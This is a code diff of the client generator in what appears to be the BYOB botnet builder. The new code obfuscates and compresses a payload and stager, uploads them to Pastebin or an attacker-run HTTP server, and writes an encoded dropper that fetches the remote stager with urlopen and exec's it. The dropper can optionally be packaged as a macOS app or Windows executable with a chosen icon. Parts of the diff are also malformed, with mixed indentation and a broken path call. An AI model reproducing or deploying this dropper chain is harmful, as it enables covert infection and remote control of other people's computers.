@@ -223,7 +223,7 @@ def run(options):
         __load__= threading.Event()
         util.display("\n    Obfuscating payload...", color='reset', style='dim', end=',')
         __spin__= util.spinner(__load__)
-        output  = '\n'.join([line for line in generators.obfuscate(payload).rstrip().replace('mport time,threading,functools','').splitlines() if '=jobs' not in line])
+        output  = '\n'.join([line for line in generators.obfuscate(payload).rstrip().splitlines() if '=jobs' not in line])
         __load__.set()
         progress_update(payload, output, task='Obfuscation')
         payload = output
@@ -241,24 +241,24 @@ def run(options):
         payload = output
 
     # upload
-    util.display("\n[>]", color='yellow', style='bright', end=',')
-    util.display("Upload", color='reset', style='dim')
+    util.display("\n    Uploading payload... ", color='reset', style='dim', end=',')
     if options.pastebin:
-        url = util.pastebin(payload, api_dev_key=options.pastebin)
+        url  = util.pastebin(payload, api_dev_key=options.pastebin)
     else:
-	dirs = ['modules/payloads','byob/modules/payloads','byob/byob/modules/payloads']
+    	dirs = ['modules/payloads','byob/modules/payloads','byob/byob/modules/payloads']
         dirname = '.'
-	for d in dirs:
-	    if os.path.isdir(d):
-		dirname = d
-	path = os.path.join(os.path.abspath(dirname), var + '.py' )
+    	for d in dirs:
+    	    if os.path.isdir(d):
+        		dirname = d
+    	path = os.path.join(os.path.abspath(dirname), var + '.py' )
         with file(path, 'w') as fp:
             fp.write(payload)
         s = 'http://{}:{}/{}'.format(options.host, options.port, urllib.pathname2url(path.strip(os.getcwd())))
         s = urllib2.urlparse.urlsplit(s)
-        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment))
+        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
         if url.endswith('.p'):
             url += 'y'
+
     util.display("    [+]", color='green', style='bright', end=',')
     util.display("Upload Complete", color='reset', style='bright')
     util.display("\t(hosting payload at: {}".format(url), color='reset', style='dim')
@@ -274,28 +274,55 @@ def run(options):
         progress_update(stager, output, task='Obfuscation')
         stager = output
 
+    if options.compress:
+        util.display("\n    Compressing stager... ", color='reset', style='dim', end=',')
+        output  = base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))
+        progress_update(stager, output, task='Compression')
+        stager = output
+
+    util.display("\n    Uploading stager... ", color='reset', style='dim', end=',')
+    if options.pastebin:
+        url2 = util.pastebin(stager, api_dev_key=options.pastebin)
+    else:
+        dirs2 = ['modules/stagers','byob/modules/stagers','byob/byob/modules/stagers']
+        dirname2 = '.'
+        for d2 in dirs2:
+            if os.path.isdir(d2):
+                dirname2 = d2
+        path2 = os.path.join(os.path.abspath(dirname2), var + '.py' )
+        with file(path2, 'w') as fp:
+            fp.write(stager)
+        s2 = 'http://{}:{}/{}'.format(options.host, options.port, urllib.pathname2url(path2.strip(os.getcwd())))
+        s2 = urllib2.urlparse.urlsplit(s2)
+        url2 = urllib2.urlparse.urlunsplit((s2.scheme, s2.netloc, os.path.normpath(s2.path), s2.query, s2.fragment)).replace('\\','/')
+        if url2.endswith('.p'):
+            url2 += 'y'
+
+    util.display("    [+]", color='green', style='bright', end=',')
+    util.display("Upload Complete", color='reset', style='bright')
+    util.display("\t(hosting stager at: {}".format(url2), color='reset', style='dim')
+
     # client
     util.display("\n[>]", color='yellow', style='bright', end=',')
-    util.display("Client", color='reset', style='bright')
-    client = 'byob_{}.py'.format(var) if not options.name else options.name
-    if not client.endswith('.py'):
-        client += '.py'
-    with file(client, 'w') as fp:
-        fp.write(stager)
-    util.display("    (saved to file: {})".format(os.path.abspath(client)).ljust(80 - len("    [+]")), style='dim', color='reset')
+    util.display("Dropper", color='reset', style='bright')
+    name = 'byob_{}.py'.format(var) if not options.name else options.name
+    if not name.endswith('.py'):
+        name += '.py'
+    dropper = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(url2)))))))
+    with file(name, 'w') as fp:
+        fp.write(dropper)
 
     # dropper
     if options.compile:
         if sys.platform == 'darwin':
-            output = generators.app(options, client)
-            progress_update(stager, open(os.path.join(output, 'Content', 'MacOS', os.path.basename(client))), task='Bundled Application')
-            client = output
+            name   = generators.app(name, icon=options.icon)
+            output = open(os.path.join(name, 'Content', 'MacOS', os.path.basename(name))).read()
         else:
-            output = generators.exe(options, client)
-            progress_update(stager, open(output, 'rb').read(), task='Compiled Standalone Executable')
-            client = output
-        util.display("    (saved to file: {})".format(os.path.abspath(client)).ljust(80 - len("    [+]")), style='dim', color='reset')
-    return client
+            name   = generators.exe(name, icon=options.icon)
+            output = open(name, 'rb').read()
+    progress_update(dropper, output, task='Dropper')
+    util.display("    (saved to file: {})".format(os.path.join((os.getcwd(), name))).ljust(80 - len("    [+]")), style='dim', color='reset')
+    return name
 
 if __name__ == '__main__':
     main()
